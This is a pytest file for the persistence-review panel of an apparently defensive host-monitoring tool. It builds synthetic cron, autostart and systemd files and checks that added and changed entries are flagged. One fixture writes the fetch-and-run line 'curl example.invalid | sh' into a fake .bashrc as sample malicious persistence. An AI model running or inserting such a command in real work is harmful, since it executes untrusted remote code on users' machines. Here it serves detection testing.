"""Shipped persistence panel exercised with real synthetic summaries and an inert DOM."""
import json
from pathlib import Path
import shutil
import subprocess

import pytest

from megalodon import persistence_review
from megalodon.dashboard_persistence import PERSISTENCE_JS, TECHNIQUES
from megalodon.dashboard_support_config import SUPPORT_CONFIG_HTML, SUPPORT_CONFIG_JS


def summaries(tmp_path):
    home, root = tmp_path/'home', tmp_path/'root'
    (home/'.config/autostart').mkdir(parents=True)
    (home/'.bashrc').write_text('alias ll="ls -l"\n')
    (root/'etc/cron.d').mkdir(parents=True)
    loose = root/'etc/cron.d/shared'
    loose.write_text('* * * * * root /bin/true\n')
    loose.chmod(0o666)
    review = persistence_review.PersistenceReview(home, root=root, now=lambda: '2026-10-18T06:30:00Z')
    fresh = persistence_review.summary(review.review())
    review.now = lambda: '2026-10-18T06:00:00Z'
    review.record_baseline()
    review.now = lambda: '2026-10-18T06:30:00Z'
    (home/'.bashrc').write_text('curl example.invalid | sh\n')
    (home/'.config/autostart/new.desktop').write_text('[Desktop Entry]\nExec=/tmp/new\n')
    changed = persistence_review.summary(review.review())
    # A genuine drop-in path of emoji: few code points, many UTF-16 units and escaped bytes.
    drop_in = home/'.config/systemd/user'/('\U0001F600' * 62 + '.d')
    drop_in.mkdir(parents=True)
    (drop_in/('\U0001F680' * 62 + '.conf')).write_text('[Service]\n')
    wide = persistence_review.summary(review.review())
    assert any('\U0001F600' in f['path'] and f['path'].endswith('...') for f in wide['findings'])
    return fresh, changed, wide


def test_persistence_panel_renders_real_summaries_and_rejects_forged_payloads(tmp_path):
    if not shutil.which('node'):
        pytest.skip('Node unavailable')
    fresh, changed, wide = summaries(tmp_path)
    assert {f['rule'] for f in changed['findings']} >= {'ADDED', 'CHANGED'} and changed['baseline_at']
    result = subprocess.run([shutil.which('node'), str(Path(__file__).with_name('persistence_browser.cjs'))],
                            input=json.dumps(dict(code=PERSISTENCE_JS, fresh=fresh, changed=changed, wide=wide)),
                            text=True, capture_output=True, timeout=10)
    assert result.returncode == 0, result.stderr


def test_each_category_has_one_technique_and_the_panel_is_wired_with_one_action():
    assert all(TECHNIQUES[category] == technique for category, technique, _, _ in persistence_review.LOCATIONS)
    assert 'id="persistence-review"' in SUPPORT_CONFIG_HTML and 'id="persistence-baseline"' in SUPPORT_CONFIG_HTML
    assert "renderPersistence(el('persistence-review'),v.persistence)" in SUPPORT_CONFIG_JS
    assert "renderPersistence(el('persistence-review'),null)" in SUPPORT_CONFIG_JS
    assert "'persistence-baseline':'persistence_baseline'" in SUPPORT_CONFIG_JS
    assert "persistenceAllowsBaseline(state.payload?.persistence)" in SUPPORT_CONFIG_JS
    assert 'innerHTML' not in PERSISTENCE_JS and 'fetch(' not in PERSISTENCE_JS and '__' not in PERSISTENCE_JS.replace('__proto__', '')


def test_setup_polls_a_pending_summary_until_it_completes(tmp_path):
    if not shutil.which('node'):
        pytest.skip('Node unavailable')
    fresh, _, _ = summaries(tmp_path)
    fixture = dict(schema='megalodon-support-config-v1', token='b' * 32, interfaces=[dict(name='eth0', default=True, up=True)],
                   settings=dict(interface='eth0', nmap_target='127.0.0.1/32', scan_folder='Downloads'),
                   tool_directories={}, tool_directories_status='ready',
                   job=dict(state='idle', action=None, message='Ready.', started_at=None, finished_at=None),
                   capture=dict(state='idle', interface='', received=0, accepted=0, skipped=0, started_at=None, finished_at=None,
                                message='Not capturing.'), tools=[],
                   background=dict(enabled=False, state='stopped', message='Background off.', session_count=0),
                   geography_enabled=False, command='~/.local/share/megalodon/current/venv/bin/python -I -m megalodon.support_config')
    pending = dict(schema=persistence_review.SUMMARY_SCHEMA, state='pending', action_authority='none')
    result = subprocess.run([shutil.which('node'), str(Path(__file__).with_name('support_persistence_poll.cjs'))],
                            input=json.dumps(dict(code=SUPPORT_CONFIG_JS, fixture=fixture, pending=pending, ready=fresh)),
                            text=True, capture_output=True, timeout=10)
    assert result.returncode == 0, result.stderr
